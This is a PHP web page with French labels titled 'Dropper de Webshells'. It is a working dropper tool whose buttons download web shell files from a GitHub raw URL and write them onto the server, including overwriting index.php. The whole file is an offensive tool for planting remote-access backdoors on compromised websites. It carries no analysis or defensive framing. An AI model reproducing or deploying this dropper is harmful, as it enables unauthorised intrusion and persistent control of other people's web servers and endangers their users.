<?php
// Fonction pour télécharger un fichier depuis une URL
function download_file($url, $destination) {
    $content = file_get_contents($url);
    if ($content !== false) {
        file_put_contents($destination, $content);
        return true;
    }
    return false;
}

// URL des fichiers webshell à télécharger
$files = [
    'index.php' => 'https://raw.githubusercontent.com/tucommenceapousser/wshwp/main/index.php',
    'plug.php' => 'https://raw.githubusercontent.com/tucommenceapousser/wshwp/main/plug.php',
];

// Variable pour stocker les messages
$message = "";

// Gestion des actions soumises
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Installer index.php
    if (isset($_POST['install_index'])) {
        if (download_file($files['index.php'], 'index.php')) {
            $message = "<div class='success'>index.php a été installé avec succès.</div>";
        } else {
            $message = "<div class='error'>Erreur lors de l'installation de index.php.</div>";
        }
    }

    // Installer plug.php
    if (isset($_POST['install_plug'])) {
        if (download_file($files['plug.php'], 'plug.php')) {
            $message = "<div class='success'>plug.php a été installé avec succès.</div>";
        } else {
            $message = "<div class='error'>Erreur lors de l'installation de plug.php.</div>";
        }
    }

    // Installer les deux fichiers
    if (isset($_POST['install_both'])) {
        $success_index = download_file($files['index.php'], 'index.php');
        $success_plug = download_file($files['plug.php'], 'plug.php');

        if ($success_index && $success_plug) {
            $message = "<div class='success'>Les deux fichiers ont été installés avec succès.</div>";
        } elseif ($success_index || $success_plug) {
            $message = "<div class='success'>Au moins un fichier a été installé avec succès.</div>";
        } else {
            $message = "<div class='error'>Erreur lors de l'installation des fichiers.</div>";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dropper de Webshells</title>
    <style>
        body {
            background-color: #0d0d0d;
            color: #00ff00;
            font-family: monospace;
            text-align: center;
            padding: 20px;
        }
        h2 {
            color: #00cc00;
        }
        input[type="submit"] {
            background-color: #00ff00;
            color: #000;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
            margin: 10px;
        }
        input[type="submit"]:hover {
            background-color: #00cc00;
        }
        .error {
            color: red;
        }
        .success {
            color: #00ff00;
        }
    </style>
</head>
<body>
    <h2>Installer des Webshells</h2>
    <form method="POST">
        <input type="submit" name="install_index" value="Installer index.php">
        <input type="submit" name="install_plug" value="Installer plug.php">
        <input type="submit" name="install_both" value="Installer les deux">
    </form>

    <!-- Affichage des messages après les actions -->
    <?php if ($message): ?>
        <?php echo $message; ?>
    <?php endif; ?>
</body>
</html>
